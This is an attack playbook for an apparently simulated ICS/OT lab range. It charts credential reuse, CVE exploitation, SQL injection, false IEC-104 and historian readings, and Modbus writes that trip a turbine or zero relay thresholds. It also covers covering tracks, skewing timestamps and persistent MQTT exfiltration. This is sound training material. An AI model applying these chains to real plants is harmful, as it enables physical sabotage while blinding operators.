# Playbook: UUPL network

All chains start at `unseen-gate` (10.10.0.5). Two main branches: direct DMZ
attacks that need no prior foothold, and IT/OT pivot chains that enter through
`wizzards-retreat` before reaching the operational and control zones.

## Entry decision

```
unseen-gate (10.10.0.5)
    |
    +-- DMZ devices are directly reachable
    |       See: DMZ chains below
    |
    +-- wizzards-retreat (10.10.0.10) is on the internet
            See: IT/OT pivot chains below
```

## DMZ chains

No prior foothold required. The internet zone has a direct route into the
entire DMZ (10.10.5.0/24).

### SSH bastion

```
unseen-gate
    --> contractors-gate:22 (10.10.5.20)
            |
            +-- root / uupl2015 (primary)
            +-- CVE-2024-6387 regreSSHion (optional)
            |
            root shell on bastion
            enterprise NIC: 10.10.1.30
            --> ics_enterprise lateral movement
                    See: IT/OT pivot chains, Stage 1 onwards
```

See [ssh-bastion-rce.md](ssh-bastion-rce.md).

The bastion's root password is reused on the Neuron gateway. If the Neuron
credential `admin / uupl2015` is found first, try it on `contractors-gate:22`
and vice versa.

### umatiGateway and OPC-UA

```
unseen-gate
    --> guild-exchange:8080 (10.10.5.10)
            no authentication (CVE-2025-27615)
            configured OPC endpoint: opc.tcp://10.10.5.13:4840
            |
            +-- read config, note endpoint
            +-- click Connect to activate OPC session
            |
            --> guild-register:4840 (10.10.5.13)
                    anonymous, SecurityMode None
                    callable methods: stopPump, startPump, resetFilter, changeOil
```

See [umati-pump-sabotage.md](umati-pump-sabotage.md).

Once the OPC connection is active, the pre-configured MQTT northbound sends node
values to `clacks-relay` (10.10.5.12:1883). Any host on the internet can
subscribe and observe the pump state.

### DNS open recursion

```
unseen-gate
    --> city-directory:53 (10.10.5.31)
            BIND9, allow-recursion any, dnssec-validation no
            |
            +-- open recursion: resolve arbitrary names
            +-- BIND version disclosure: dig version.bind chaos txt @10.10.5.31
            +-- amplification reflector (DoS vector, educational)
            +-- cache poisoning (requires on-path position)
                    target record: uupl-historian.uupl.am
                    effect: historian traffic redirected, credentials harvested
```

See [dns-poisoning.md](dns-poisoning.md).

### NTP time manipulation

```
unseen-gate
    --> guild-clock:123 (10.10.5.30)
            no NTP authentication
            |
            +-- ntpq -p: enumerate peers and upstream sources
            +-- forge NTP responses to DMZ clients (on-path)
                    effects:
                        TLS certificate validity windows shift
                        log timestamps become unreliable
                        replay-protection windows become exploitable
                        sequence-of-events records are corrupted
```

See [time-manipulation.md](time-manipulation.md).

Time manipulation is a precondition for other attacks rather than a standalone
objective. Use it before, or in parallel with, a chain that generates log
evidence: the corrupted timestamps complicate blue-team correlation.

### IEC-104 datapoint falsification

```
unseen-gate
    --> substation-rtu:8080 (10.10.5.14)
            no-auth REST management API
            IEC-104 protocol on :2404 (no auth)
            |
            +-- GET /datapoints: list all six pre-seeded values
            +-- POST /datapoints/<id>: set arbitrary value
            |
            decision: consistent or inconsistent falsification?
                    |
                    +-- inconsistent (voltage 0, breaker still closed):
                    |       looks like sensor fault, may be noticed
                    +-- consistent, out-of-band (frequency 47.2 Hz):
                            looks like real grid event, triggers protection response
```

See [iec104-false-readings.md](iec104-false-readings.md).

Any IEC-104 master polling `substation-rtu:2404` receives the injected values
immediately. The REST write and the IEC-104 read are separate protocol paths;
neither requires authentication.

## IT/OT pivot chains

All paths enter via `wizzards-retreat` (10.10.0.10). Three simultaneous
entry paths are available; any one is sufficient.

### Stage 0: compromise wizzards-retreat

```
unseen-gate
    --> wizzards-retreat (10.10.0.10)
            |
            +-- Path A: SSH  rincewind / wizzard
            +-- Path B: HTTP /status   admin / admin (recon only, no shell)
            +-- Path C: OSINT  cat ~/loot/prior-recon.txt, then Path A
```

Once on `wizzards-retreat`, collect:
- `~/.ssh-keys/uupl_eng_key` (Ed25519 key for engineer@10.10.2.30)
- `~/notes.txt` (historian URL, SCADA URL, enterprise IPs)
- `~/.vpn/uupl-vpn.conf` (WireGuard config, cosmetic)

### Stage 1 decision: short path or full chain

```
wizzards-retreat (enterprise NIC: 10.10.1.3)
    |
    +-- Short path: use Ed25519 key directly
    |       --> uupl-eng-ws:22 (10.10.2.30)
    |               no password required
    |               See: admin-home-pivot.md
    |
    +-- Full chain: enterprise recon first
            --> ics_enterprise (10.10.1.0/24)
                    See: enterprise-to-turbine-trip.md, Stages 1-2
```

The short path reaches the engineering workstation in two hops. The full chain
adds three stages of enterprise credential harvesting and historian SQL
injection, and is worth doing when the objective is to understand the complete
credential chain rather than reach the turbine quickly.

#### Short path

See [admin-home-pivot.md](admin-home-pivot.md).

```
wizzards-retreat
    --> uupl-eng-ws (10.10.2.30) via Ed25519 key
            control NIC: 10.10.3.100
            --> turbine PLC (10.10.3.21:502)
            --> relay IEDs (10.10.3.31, 10.10.3.32)
            --> meter (10.10.3.33)
```

#### Full chain

See [enterprise-to-turbine-trip.md](enterprise-to-turbine-trip.md).

```
wizzards-retreat (10.10.1.3)
    --> hex-legacy-1 (10.10.1.10)
            anonymous FTP: UUPL/NETWORK.TXT, LOGBOOK/ENGINEER.LOG
            SMB guest: same files
            credentials harvested: bursardesk/Octavo1, engineer/spanner99, hist_admin/Historian2015
    |
    --> bursar-desk (10.10.1.20)
            SSH: bursardesk / Octavo1
            operational NIC: 10.10.2.100
            loot: ops-access.conf (historian + SCADA credentials)
    |
    --> uupl-historian (10.10.2.10)
            |
            decision: path traversal or SQL injection?
                    |
                    +-- path traversal: /export?tag=../historian.db
                    |       See: historian-path-traversal.md
                    +-- SQL injection: /report?asset=x'+UNION+...
                    |       See: enterprise-to-turbine-trip.md Stage 3
                    |
                    both yield: alarm thresholds, hist_admin/Historian2015, hist_read/history2017
    |
    --> uupl-eng-ws (10.10.2.30)
            SSH: engineer / spanner99
            or:  Ed25519 key from wizzards-retreat
            control NIC: 10.10.3.100
```

### Stage 2: operational zone techniques

Reachable from `bursar-desk` (10.10.2.100) or `uupl-eng-ws` (10.10.2.30).

```
operational zone (10.10.2.0/24)
    |
    +-- uupl-historian (10.10.2.10)
    |       |
    |       +-- path traversal: download historian.db
    |       |       See: historian-path-traversal.md
    |       +-- ingest endpoint: inject false readings
    |               See: historian-ingest-poison.md
    |               (credentials from SCADA /config: hist_read / history2017)
    |
    +-- distribution-scada (10.10.2.20)
            |
            +-- Scada-LTS web: admin / admin
            +-- SSH: scada_admin / W1nd0ws@2016 (from /config endpoint)
            +-- /run/stunnel-certs/client.key (world-readable)
                    --> connect to uupl-modbus-gw:8502 (stunnel gateway)
                    --> direct Modbus to turbine PLC, bypassing SCADA
                    See: stunnel-client-key-theft.md
```

#### Historian ingest with SCADA credential chain

```
distribution-scada /config (admin:admin)
    --> hist_read / history2017
            --> POST /ingest: inject false readings for any asset
                    |
                    +-- suppress real alarms: inject normal values continuously
                    +-- generate false alarms: inject above threshold (3300 RPM overspeed)
                    See: historian-ingest-poison.md
```

Combine with a turbine estop (Stage 3 below): trip the turbine via Modbus while
injecting normal RPM readings into the historian. Operators see a healthy
dashboard while the machine is offline.

#### Neuron covert exfil (requires control zone reachability)

```
uupl-eng-ws (10.10.2.30, operational zone)
    |
    note: control zone (10.10.3.21:502) is reachable from here
    |
    --> sorting-office:7000 (10.10.5.11, Neuron gateway)
            admin / uupl2015
            |
            same password as contractors-gate root
            |
            add Modbus TCP south node -> 10.10.3.21:502 (via socat relay on eng-ws)
            add tags: RPM, temp, governor setpoint, estop coil
            Neuron polls PLC, publishes northbound to clacks-relay:1883
            |
            --> subscribe from unseen-gate:
                    mosquitto_sub -h 10.10.5.12 -p 1883 -t '#' -v
```

See [neuron-covert-exfil.md](neuron-covert-exfil.md).

### Stage 3: control zone techniques

Reachable from `uupl-eng-ws` (control NIC: 10.10.3.100).

```
control zone (10.10.3.0/24)
    |
    +-- uupl-meter (10.10.3.33:502)
    |       read input registers: RPM, temp, pressure, voltage, current
    |       no authentication
    |       See: meter-modbus-read.md
    |
    +-- uupl-relay-a (10.10.3.31:502)
    |   uupl-relay-b (10.10.3.32:502)
    |       |
    |       +-- force trip: write coil 0 = True
    |       |       See: ied-relay-force-trip.md
    |       +-- threshold manipulation: write holding register to 0
    |               relay trips on any measurable current
    |               looks like a protection event rather than a coil write
    |               See: enterprise-to-turbine-trip.md, variant section
    |
    +-- hex-turbine-plc (10.10.3.21:502)
            |
            +-- read live state: modbus_read.py 10.10.3.21 502 input 0 11
            |
            decision: noisy or stealthy trip?
                    |
                    +-- emergency stop (noisy):
                    |       write coil 0 = True
                    |       immediate trip, logged as estop
                    |       See: enterprise-to-turbine-trip.md Stage 5
                    |
                    +-- overspeed trip (stealthy):
                    |       write holding 0 = 4000 (setpoint above 3300 RPM threshold)
                    |       turbine accelerates until overspeed protection fires
                    |       appears as a protection event
                    |       See: enterprise-to-turbine-trip.md Stage 5
                    |
                    +-- relay threshold write (subtlest):
                            write relay HR[2] = 0 on relay-a or relay-b
                            overcurrent threshold drops to zero
                            relay trips on any measurable current
                            turbine isolated by its own protection system
                            See: ied-relay-force-trip.md
```

## Combined chains

### Recon before action

The alarm thresholds extracted by the historian path traversal or SQL injection
map directly to the relay holding registers. Run the historian chain first to
learn the exact threshold values, then write precisely crafted values to the
relay registers: just below threshold to prevent protection firing on real
conditions, or to zero to guarantee a trip.

```
historian-path-traversal.md (get alarm_config table)
    --> exact values: RPM overspeed 3300, relay_a overcurrent 150 A
    --> ied-relay-force-trip.md (write threshold, not coil)
```

### Cover tracks with ingest poisoning

Trip the turbine via Modbus, then immediately start the historian ingest loop to
inject normal-looking RPM readings. Operators see a healthy dashboard while the
turbine is offline. The SCADA alarm pipeline does not fire because the injected
values are below threshold.

```
enterprise-to-turbine-trip.md Stage 5 (trip turbine)
    +-- historian-ingest-poison.md Stage 4 (sustain false readings)
            --> operators see RPM 2999 on dashboard
            --> turbine is actually stopped
            --> window to work in the control zone before anyone investigates
```

### Persistence via Neuron

After any Phase 1 foothold, configure the Neuron gateway with a southbound Modbus
device. Close the interactive session. The gateway continues polling and
publishing live PLC telemetry indefinitely, accessible from the internet at any
time, without further attacker access to the inner network.

```
any Phase 1 foothold
    --> neuron-covert-exfil.md (configure southbound, then exit)
            --> persistent telemetry stream: clacks-relay:1883 from internet
```

### Dual DMZ entry via credential reuse

The Neuron password `admin / uupl2015` and the SSH bastion root password
`uupl2015` are the same. Either can be discovered first; both give different but
complementary access.

```
contractors-gate:22 root / uupl2015
    --> ssh-bastion-rce.md (enterprise pivot)

sorting-office:7000 admin / uupl2015
    --> neuron-covert-exfil.md (covert exfil pipeline)
```

Finding one credential and trying it on the other is worth one attempt.
